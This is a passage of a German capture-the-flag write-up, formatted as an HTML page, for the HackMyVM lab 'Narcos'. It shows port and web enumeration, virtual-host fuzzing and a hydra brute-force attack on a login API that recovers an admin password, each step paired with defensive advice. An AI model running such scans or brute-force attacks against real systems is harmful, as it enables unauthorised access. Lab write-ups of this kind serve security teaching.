@@ -1,0 +1,640 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Narcos - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Narcos - HackMyVM - Easy - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Rot angepasst werden) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Rot angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">office2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">vi</div> <!-- Auch wenn nur erwähnt -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.116	08:00:27:ac:1c:33	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk (Layer 2) nach aktiven Geräten zu durchsuchen. Er sendet ARP-Anfragen (Address Resolution Protocol) an alle möglichen IP-Adressen im lokalen Subnetz und listet die Geräte auf, die antworten, zusammen mit ihrer IP-Adresse, MAC-Adresse und dem Hersteller der Netzwerkkarte (basierend auf der MAC-Adresse).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist ein grundlegender erster Schritt in der Reconnaissance-Phase, um schnell aktive Hosts im direkt erreichbaren Netzwerk zu identifizieren, ohne auf höhere Protokolle wie ICMP oder TCP angewiesen zu sein. Das Ergebnis zeigt einen einzelnen Host (192.168.2.116) mit einer MAC-Adresse von Oracle VirtualBox (PCS Systemtechnik GmbH ist der OUI-Inhaber für VirtualBox). Dies bestätigt die Anwesenheit unseres Ziels im Netzwerk.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `arp-scan` ist effektiv für die initiale Host-Entdeckung in lokalen Netzwerken. Es sollte immer als einer der ersten Schritte durchgeführt werden. Manchmal können auch versteckte oder unerwartete Geräte auf diese Weise gefunden werden.
+<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring-Systeme sollten ungewöhnliche ARP-Scan-Aktivitäten erkennen können. Obwohl ARP-Scans normal sein können, können aggressive Scans auf einen Angriffsversuch hindeuten. Eine Segmentierung des Netzwerks kann die Reichweite solcher Scans begrenzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.116 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-13 22:35 CET
+Nmap scan report for narcos (192.168.2.116)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 34ca6962408fbb10a249063074839d69 (RSA)</span>
+|   <span class="command">256 7b2591f304543dc3c2449bb700b938bb (ECDSA)</span>
+|_  <span class="command">256 a823a4dff8e96a8efe7438fa48c759df (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
+|_<span class="command">http-title: Escobar Store</span>
+|_<span class="command">http-server-header: Apache/2.4.18 (Ubuntu)</span>
+MAC Address: 08:00:27:AC:1C:33 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 3.X|4.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span>
+OS details: <span class="command">Linux 3.2 - 4.9</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms narcos (192.168.2.116)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `nmap`-Befehl führt einen umfassenden Scan des Ziels (192.168.2.116) durch:
+*   `-sS`: Führt einen TCP SYN-Scan (Stealth Scan) durch, der oft weniger auffällig ist als ein vollständiger TCP-Connect-Scan.
+*   `-sC`: Führt die Standard-Nmap-Skripte (`default` category) gegen die gefundenen offenen Ports aus, um zusätzliche Informationen zu sammeln (z.B. Hostkeys, HTTP-Titel).
+*   `-T5`: Setzt das Timing-Template auf "insane", um den Scan zu beschleunigen (kann auf sensiblen Netzwerken oder bei IDS/IPS auffällig sein).
+*   `-A`: Aktiviert die Betriebssystemerkennung (`-O`), Versionserkennung (`-sV`), Skript-Scanning (`-sC`) und Traceroute (`--traceroute`).
+*   `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene TCP-Ports:
+*   **Port 22 (SSH):** Läuft OpenSSH Version 7.2p2 auf Ubuntu. Diese Version ist bekannt für einige Schwachstellen, obwohl keine unmittelbar kritischen für einen direkten Remote-Zugriff offensichtlich sind (ohne weitere Enumeration). Die Hostkeys werden ebenfalls angezeigt.
+*   **Port 80 (HTTP):** Läuft ein Apache Webserver Version 2.4.18 auf Ubuntu. Auch diese Apache-Version ist veraltet und potenziell anfällig. Der Titel der Webseite lautet "Escobar Store".
+Die Betriebssystemerkennung deutet auf ein Linux-System (Kernel 3.x oder 4.x) hin, was mit den Ubuntu-Versionen der Dienste übereinstimmt. Die MAC-Adresse bestätigt erneut, dass es sich um eine Oracle VirtualBox VM handelt. Die geringe Latenz und Network Distance (1 hop) bestätigen, dass sich das Ziel im selben lokalen Netzwerk befindet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die offenen Ports SSH und HTTP sind die primären Angriffsvektoren. Der nächste Schritt ist die detaillierte Enumeration des Webservers (Port 80), da Webanwendungen oft anfälliger sind. Die SSH-Version sollte auf bekannte Exploits überprüft werden, aber ohne Anmeldedaten ist ein direkter Angriff schwierig. Die `-T5`-Einstellung sollte mit Vorsicht verwendet werden; `-T4` ist oft ein besserer Kompromiss zwischen Geschwindigkeit und Unauffälligkeit.
+<br><strong>Empfehlung (Admin):</strong> Beide Dienste (SSH und Apache) sollten auf die neuesten stabilen Versionen aktualisiert werden, um bekannte Schwachstellen zu mitigieren. Der Zugriff auf SSH sollte idealerweise auf bestimmte IP-Adressen beschränkt und passwortbasierte Logins deaktiviert werden (nur Key-basiert). Für den Webserver sollten Sicherheitsheader konfiguriert und unnötige Informationen (wie detaillierte Server-Versionen) unterdrückt werden.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.116 -Iv</span></div>
+                    <pre>
+*   Trying 192.168.2.116:80...
+* Connected to 192.168.2.116 (192.168.2.116) port 80 (#0)
+> HEAD / HTTP/1.1
+> Host: 192.168.2.116
+> User-Agent: curl/7.86.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+< <span class="command">HTTP/1.1 200 OK</span>
+< <span class="command">Date: Sun, 13 Nov 2022 21:36:34 GMT</span>
+< <span class="command">Server: Apache/2.4.18 (Ubuntu)</span>
+< <span class="command">Last-Modified: Tue, 24 Nov 2020 17:05:05 GMT</span>
+< <span class="command">ETag: "2d1e-5b4dd4ff52cf3"</span>
+< <span class="command">Accept-Ranges: bytes</span>
+< <span class="command">Content-Length: 11550</span>
+< <span class="command">Vary: Accept-Encoding</span>
+< <span class="command">Content-Type: text/html</span>
+<
+* Connection #0 to host 192.168.2.116 left intact
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `curl http://192.168.2.116 -Iv` wird verwendet, um die HTTP-Header der Webseite auf der Hauptseite (`/`) des Webservers abzurufen.
+*   `-I`: Sendet eine HEAD-Anfrage statt einer GET-Anfrage (holt nur die Header, nicht den Body).
+*   `-v`: Aktiviert den "verbose"-Modus, der detaillierte Informationen über die Verbindung und die Anfrage-/Antwort-Header anzeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe bestätigt die Ergebnisse des Nmap-Scans: Der Server antwortet mit `HTTP/1.1 200 OK` und identifiziert sich als `Apache/2.4.18 (Ubuntu)`. Es werden keine ungewöhnlichen oder besonders aufschlussreichen Header angezeigt, außer der Bestätigung der Server-Version und des Content-Typs (`text/html`). Das `ETag`-Header könnte potenziell für Informationslecks genutzt werden (Inode-Leak), aber dies ist hier nicht direkt ersichtlich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `curl` ist nützlich für schnelle Header-Checks und einfache Interaktionen mit Webseiten. Der nächste logische Schritt ist das Durchsuchen nach versteckten Verzeichnissen und Dateien mit Tools wie `gobuster` oder `dirb`.
+<br><strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, sollte die Server-Signatur (`Server: Apache/2.4.18 (Ubuntu)`) aus den HTTP-Headern entfernt oder verallgemeinert werden (z.B. nur "Apache"), um Angreifern weniger Informationen zu geben. Sicherheitsheader wie `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security` und `Content-Security-Policy` sollten implementiert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.116 -x txt,php,rar,zip,tar,pem,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.116</span>
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   <span class="command">404,403</span>
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              <span class="command">raw,pdf,tar,jpeg,rar,pem,bat,pl,png,txt,xls,doc,sql,dll,rtf,zip,docx,mdb,aspx,phtml,kdbx,pub,ps1,exe,db,sh,py,jpg,html,csv,xlsx,asp,accdb,gz,xml,php</span>
+[+] Expanded:                true
+[+] No status:               true
+[+] Timeout:                 10s
+===============================================================
+2022/11/13 22:36:09 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.116/index.html</span>           [Size: 11550]
+<span class="command">http://192.168.2.116/images</span>               [Size: 315] [--> http://192.168.2.116/images/]
+<span class="command">http://192.168.2.116/js</span>                   [Size: 311] [--> http://192.168.2.116/js/]
+<span class="command">http://192.168.2.116/squirrelmail/src/index.php</span>            [Size: 0] [--> ../index.php]
+<span class="command">http://192.168.2.116/squirrelmail/src/download.php</span>         [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/src/login.php</span>            [Size: 2912]
+<span class="command">http://192.168.2.116/squirrelmail/src/help.php</span>             [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/src/search.php</span>           [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/src/image.php</span>            [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/src/redirect.php</span>         [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/src/options.php</span>          [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/src/webmail.php</span>          [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/src/mailto.php</span>           [Size: 0] [--> http://192.168.2.116/squirrelmail/src/login.php?mailtodata=a%3A0%3A%7B%7D]
+<span class="command">http://192.168.2.116/squirrelmail/src/folders.php</span>          [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/src/compose.php</span>          [Size: 1857]
+<span class="command">http://192.168.2.116/squirrelmail/src/addressbook.php</span>      [Size: 1803]
+<span class="command">http://192.168.2.116/squirrelmail/index.php</span>            [Size: 0] [--> src/login.php]
+<span class="command">http://192.168.2.116/squirrelmail/images</span>               [Size: 328] [--> http://192.168.2.116/squirrelmail/images/]
+<span class="command">http://192.168.2.116/squirrelmail/help</span>                 [Size: 326] [--> http://192.168.2.116/squirrelmail/help/]
+<span class="command">http://192.168.2.116/squirrelmail/themes</span>               [Size: 328] [--> http://192.168.2.116/squirrelmail/themes/]
+<span class="command">http://192.168.2.116/squirrelmail/plugins</span>              [Size: 329] [--> http://192.168.2.116/squirrelmail/plugins/]
+<span class="command">http://192.168.2.116/squirrelmail/src</span>                  [Size: 325] [--> http://192.168.2.116/squirrelmail/src/]
+<span class="command">http://192.168.2.116/squirrelmail/include</span>              [Size: 329] [--> http://192.168.2.116/squirrelmail/include/]
+<span class="command">http://192.168.2.116/squirrelmail/config</span>               [Size: 328] [--> http://192.168.2.116/squirrelmail/config/]
+<span class="command">http://192.168.2.116/squirrelmail/class</span>                [Size: 327] [--> http://192.168.2.116/squirrelmail/class/]
+<span class="command">http://192.168.2.116/squirrelmail/functions</span>            [Size: 331] [--> http://192.168.2.116/squirrelmail/functions/]
+<span class="command">http://192.168.2.116/squirrelmail/po</span>                   [Size: 324] [--> http://192.168.2.116/squirrelmail/po/]
+<span class="command">http://192.168.2.116/squirrelmail/locale</span>               [Size: 328] [--> http://192.168.2.116/squirrelmail/locale/]
+===============================================================
+2022/11/13 22:38:14 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `gobuster dir` wird verwendet, um Webserver-Verzeichnisse und -Dateien durch "Brute-Forcing" mit einer Wortliste zu entdecken.
+*   `-u http://192.168.2.116`: Die Ziel-URL.
+*   `-x ...`: Eine lange Liste von Dateierweiterungen, die an jedes Wort in der Wortliste angehängt werden sollen.
+*   `-w ...`: Pfad zur Wortliste (`directory-list-2.3-medium.txt` von SecLists, eine gängige Liste mittlerer Größe).
+*   `-b '403,404'`: Ignoriert Antworten mit den Statuscodes 403 (Forbidden) und 404 (Not Found).
+*   `-e`: Erweitert die Ausgabe, um die vollständige URL anzuzeigen.
+*   `-t 100`: Verwendet 100 Threads für schnellere Scans (kann den Server belasten oder zu Fehlern führen).
+*   `-n`: Zeigt keine Statuscodes in der Ausgabe an (nur gefundene Pfade).
+*   `-k`: Überspringt die SSL-Zertifikatsprüfung (hier irrelevant, da HTTP).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `gobuster` findet neben den Standardverzeichnissen `/images` und `/js` eine interessante Installation: `/squirrelmail`. SquirrelMail ist eine bekannte, aber veraltete Webmail-Anwendung. Es werden zahlreiche PHP-Dateien und Unterverzeichnisse innerhalb von `/squirrelmail` gefunden, insbesondere unter `/squirrelmail/src/`. Dies stellt eine signifikante Angriffsfläche dar, da veraltete Webanwendungen oft bekannte Schwachstellen aufweisen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene SquirrelMail-Instanz ist das Hauptziel für weitere Enumeration und Ausnutzung. Es sollte nach bekannten Schwachstellen für die spezifische Version von SquirrelMail (falls ermittelbar) gesucht werden. Die Login-Seite (`/squirrelmail/src/login.php`) ist ein potenzieller Angriffspunkt für Brute-Force-Angriffe oder Default-Credentials. Die hohe Anzahl an Threads (`-t 100`) sollte bei Bedarf reduziert werden, falls der Server instabil wird.
+<br><strong>Empfehlung (Admin):</strong> Nicht benötigte Webanwendungen wie SquirrelMail sollten deinstalliert werden. Wenn es benötigt wird, muss es dringend auf die neueste Version aktualisiert und abgesichert werden. Verzeichnisauflistungen (Directory Indexing), falls auf `/images` oder `/js` aktiv, sollten deaktiviert werden. Die Verwendung von Web Application Firewalls (WAFs) kann helfen, automatisierte Scans wie die von `gobuster` zu erkennen und zu blockieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.116</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.116
++ Target Hostname:    192.168.2.116
++ Target Port:        80
++ Start Time:         2022-11-13 22:48:27 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.18 (Ubuntu)</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
++ <span class="password">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="password">Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span>
++ <span class="password">Server may leak inodes via ETags, header found with file /, inode: 2d1e, size: 5b4dd4ff52cf3, mtime: gzip</span>
++ Allowed HTTP Methods: <span class="command">POST, OPTIONS, GET, HEAD</span>
++ <span class="password">Cookie SQMSESSID created without the httponly flag</span>
++ <span class="password">OSVDB-3093: /squirrelmail/src/read_body.php: SquirrelMail found</span>
++ <span class="password">OSVDB-3268: /images/: Directory indexing found.</span>
++ <span class="password">OSVDB-3233: /icons/README: Apache default file found.</span>
++ 7915 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2022-11-13 22:50:26 (GMT1) (119 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `nikto -h 192.168.2.116` führt einen Webserver-Schwachstellen-Scan gegen das Ziel durch. Nikto prüft auf tausende bekannte potenziell gefährliche Dateien/CGIs, veraltete Server-Software und spezifische Konfigurationsprobleme.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt viele der bisherigen Erkenntnisse und fügt wichtige Details hinzu:
+*   **Veralteter Apache:** Bestätigt, dass Apache 2.4.18 veraltet ist.
+*   **Fehlende Sicherheitsheader:** Meldet das Fehlen wichtiger Header wie `X-Frame-Options`, `X-XSS-Protection` und `X-Content-Type-Options`, was auf potenzielle Angriffsvektoren wie Clickjacking und Cross-Site Scripting (XSS) hindeutet.
+*   **Inode Leak:** Das potenzielle Informationsleck über ETags wird erneut erwähnt.
+*   **HTTPOnly Flag fehlt:** Das Cookie `SQMSESSID` (wahrscheinlich von SquirrelMail) wird ohne das `HttpOnly`-Flag gesetzt, was es anfällig für Diebstahl durch XSS macht.
+*   **SquirrelMail bestätigt:** Nikto identifiziert ebenfalls die SquirrelMail-Installation.
+*   **Directory Indexing:** Meldet, dass für das Verzeichnis `/images/` die Verzeichnisauflistung aktiv ist, was es Angreifern ermöglicht, den Inhalt des Verzeichnisses einzusehen.
+*   **Apache Default File:** Findet eine Standard-Apache-Datei (`/icons/README`), was auf eine unvollständige Bereinigung der Standardkonfiguration hindeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Nikto-Ergebnisse verstärken die Notwendigkeit, sich auf SquirrelMail zu konzentrieren. Die fehlenden Sicherheitsheader und das fehlende `HttpOnly`-Flag bei Cookies erhöhen die Erfolgswahrscheinlichkeit von XSS-Angriffen, falls eine entsprechende Schwachstelle gefunden wird. Das Directory Indexing auf `/images/` sollte manuell überprüft werden, um zu sehen, ob sensible Informationen preisgegeben werden.
+<br><strong>Empfehlung (Admin):</strong> Alle von Nikto gemeldeten Punkte sollten adressiert werden: Apache aktualisieren, fehlende Sicherheitsheader hinzufügen, das `HttpOnly`-Flag für Session-Cookies setzen, Directory Indexing deaktivieren und Standard-Dateien wie `/icons/README` entfernen. Eine gründliche Konfigurationsprüfung des Webservers ist dringend empfohlen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://escobar.hmv" -H "Host: FUZZ.escobar.hmv" --hh 11550</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://escobar.hmv/
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000441:   200        102 L    292 W      4245 Ch     "management"</span>
+
+Total time: 1.470642s
+Processed Requests: 220560
+Filtered Requests: 220559
+Requests/sec.: 149974.7
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `wfuzz`-Befehl wird verwendet, um virtuelle Hosts (Subdomains) auf dem Webserver zu entdecken. Er funktioniert, indem er Anfragen an die IP-Adresse des Servers (implizit über den Hostnamen `escobar.hmv`, der wahrscheinlich in `/etc/hosts` auf die Ziel-IP gemappt wurde) sendet, aber den `Host`-Header der Anfrage variiert.
+*   `-c`: Zeigt die Ausgabe farbig an.
+*   `-w ...`: Verwendet dieselbe Wortliste wie `gobuster`, aber diesmal für Subdomain-Namen.
+*   `-u "http://escobar.hmv"`: Die Basis-URL. Der Hostname hier ist weniger wichtig als der im `-H`-Header.
+*   `-H "Host: FUZZ.escobar.hmv"`: Dies ist der entscheidende Teil. `wfuzz` ersetzt `FUZZ` durch jedes Wort aus der Wortliste und sendet diesen Wert als `Host`-Header.
+*   `--hh 11550`: Versteckt Antworten, die genau 11550 Zeichen haben. Dies ist die Größe der Standardseite (`index.html`), die wir zuvor gesehen haben. Anfragen mit falschen `Host`-Headern landen oft auf der Standardseite, daher filtert diese Option sie heraus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan ist erfolgreich und findet einen virtuellen Host: `management.escobar.hmv`. Dieser Host liefert eine andere Antwort (4245 Chars) als die Standardseite, was darauf hindeutet, dass er eine separate Webanwendung oder einen anderen Bereich des Webservers hostet. Dies ist ein sehr wichtiger Fund, da versteckte Verwaltungs-Interfaces oft weniger gut gesichert sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die Untersuchung des gefundenen virtuellen Hosts `management.escobar.hmv`. Dazu muss dieser Hostname in der lokalen `/etc/hosts`-Datei des Angreifers auf die IP-Adresse des Ziels (192.168.2.116) gemappt werden. Anschließend sollten die gleichen Enumerationstechniken (Nmap-Skripte auf Port 80 für diesen vHost, curl, gobuster, nikto) erneut auf `http://management.escobar.hmv` angewendet werden.
+<br><strong>Empfehlung (Admin):</strong> Virtuelle Hosts sollten ordnungsgemäß konfiguriert und dokumentiert sein. Nicht öffentliche oder administrative vHosts sollten durch Zugriffskontrollen (z.B. IP-Beschränkungen, Authentifizierung) geschützt werden. Die Filterung nach Antwortgröße (`--hh`) ist eine gängige Technik; Admins können dies erschweren, indem sie Fehlermeldungen oder Standardseiten leicht variieren lassen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+#192.168.2.107   whythisapiissofast.kitty.hmv kitty.hmv fake.local jwt.hmv
+<span class="command">192.168.2.116    management.escobar.hmv escobar.hmv</span>
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl zeigt den Inhalt der lokalen `/etc/hosts`-Datei auf dem Angreifer-System an. Diese Datei wird vom Betriebssystem verwendet, um Hostnamen manuell IP-Adressen zuzuordnen, bevor DNS-Server abgefragt werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt, dass der zuvor mit `wfuzz` entdeckte virtuelle Host `management.escobar.hmv` sowie der Basis-Hostname `escobar.hmv` der IP-Adresse des Ziels `192.168.2.116` zugeordnet wurden. Dies ist ein notwendiger Schritt, um den Webbrowser und andere Tools auf dem Angreifer-System anzuweisen, Anfragen an diese Hostnamen an die korrekte IP-Adresse zu senden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das manuelle Pflegen der `/etc/hosts`-Datei ist entscheidend beim Testen von Webanwendungen mit virtuellen Hosts. Es ist eine gute Praxis, Einträge zu kommentieren oder zu entfernen, wenn sie nicht mehr benötigt werden, um Konflikte zu vermeiden. Tools wie Burp Suite können auch so konfiguriert werden, dass sie Hostnamen ohne Änderung der System-weiten `/etc/hosts`-Datei auflösen.
+<br><strong>Empfehlung (Admin):</strong> Aus Admin-Sicht ist diese Datei auf dem Angreifer-System nicht relevant. Es unterstreicht jedoch die Bedeutung von DNS-Sicherheit und der korrekten Konfiguration virtueller Hosts auf dem Server.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l admin -P /usr/share/wordlists/rockyou.txt management.escobar.hmv http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden' -t 64 -f</span></div>
+                    <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-13 23:03:12
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344411 login tries (l:1/p:14344411), ~224132 tries per task
+[DATA] attacking http-post-form://management.escobar.hmv:80/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden
+[ATTEMPT] target management.escobar.hmv - login "admin" - pass "123456" - 1 of 14344411 [child 0]
+...
+[80][http-post-form] host: management.escobar.hmv   login: <span class="command">admin</span>   password: <span class="password">gabriela</span>
+[STATUS] attack finished for management.escobar.hmv (<span class="password">valid pair found</span>)
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at 2022-11-13 23:04:01
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl verwendet `hydra`, ein beliebtes Tool für Brute-Force-Angriffe auf Login-Mechanismen, um das Passwort für den Benutzer `admin` auf der Login-Seite des virtuellen Hosts `management.escobar.hmv` zu finden.
+*   `-l admin`: Gibt den Benutzernamen an, der getestet werden soll.
+*   `-P /usr/share/wordlists/rockyou.txt`: Gibt den Pfad zur Passwortliste (`rockyou.txt`, eine sehr umfangreiche Liste mit häufig vorkommenden Passwörtern) an.
+*   `management.escobar.hmv`: Das Zielsystem.
+*   `http-post-form`: Das Hydra-Modul für Angriffe auf Web-Formulare, die via POST-Methode übermittelt werden.
+*   `'/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden'`: Dies ist die Konfiguration für das Modul:
+    *   `/api/login`: Der Pfad auf dem Server, an den die Login-Daten gesendet werden.
+    *   `{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}`: Die Daten, die im POST-Request gesendet werden. Hydra ersetzt `^USER^` (hier fest `admin`) und `^PASS^` (mit Passwörtern aus der Liste). Die Backslashes (`\:`) maskieren die Doppelpunkte für Hydra. Ein leeres Recaptcha-Feld wird mitgesendet.
